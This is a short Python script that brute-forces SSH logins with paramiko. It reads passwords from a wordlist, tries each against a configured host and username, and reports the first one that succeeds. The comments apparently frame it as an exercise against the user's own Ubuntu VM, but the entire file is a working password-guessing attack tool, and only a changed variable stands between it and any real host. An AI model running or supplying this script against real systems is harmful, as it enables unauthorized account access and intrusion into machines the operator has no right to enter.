import paramiko
import time

# Configuration
target_ip = "Localhost"  # Replace with your Ubuntu VM's IP
username = "testuser"  # Replace with the username you set
wordlist_path = "wordlist.txt"  # Path to your wordlist
delay = 0.5  # Delay between attempts

def try_login(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target_ip, username=username, password=password, timeout=5)
        print(f"[SUCCESS] Password found: {password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[FAIL] Password {password} failed")
        return False
    except Exception as e:
        print(f"[ERROR] {e}")
        return False
    finally:
        ssh.close()
def brute_force():
    try:
        with open(wordlist_path, "r") as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print("Error: Wordlist not found!")
        return

    print(f"Starting brute force on {target_ip} with user {username}")
    for password in passwords:
        if try_login(password):
            break
        time.sleep(delay)

brute_force()